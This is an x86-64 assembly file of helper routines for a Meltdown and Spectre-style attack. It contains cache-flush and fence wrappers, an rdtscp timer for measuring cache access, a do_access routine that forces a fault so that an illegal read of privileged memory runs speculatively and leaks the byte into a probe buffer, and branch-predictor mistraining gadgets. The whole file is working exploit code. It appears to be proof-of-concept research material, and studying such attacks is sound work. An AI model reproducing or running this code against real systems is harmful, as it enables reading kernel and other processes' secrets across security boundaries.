.global clflush
clflush:
    clflush (%rdi)
    ret

.global mfence
mfence:
    mfence
    ret

.global measure_access_time
measure_access_time:
    push %rdi
    push %rbx

    // rbx = cur_tsc
    rdtscp
    mov %rax, %rbx

    // Deref memory at rdi (rdi is ptr param) 
    mov (%rdi), %rdi

    // rax = cur_tsc - rbx
    rdtscp
    sub %rbx, %rax

    pop %rbx
    pop %rdi
    ret

.global do_access
do_access:
    push %rbx
    push %rdi
    push %rsi

    // Cause an exception now. This will make the code below happen only speculatively
    movb (0x0), %al

    // Do the Meltdown illegal access (rsi is ptr param)
    movb (%rsi), %bl
    shl $0xc, %rbx
    // rdi is our_buffer param
    mov (%rdi, %rbx, 1), %rbx

.global after_exception
after_exception:

    pop %rsi
    pop %rdi
    pop %rbx
    ret

// The following will be moved to correct virtual addresses to fool the branch predictor

.global btb_call
btb_call:
    callq *%rdi
    ret

.global btb_gadget
btb_gadget:
    ret
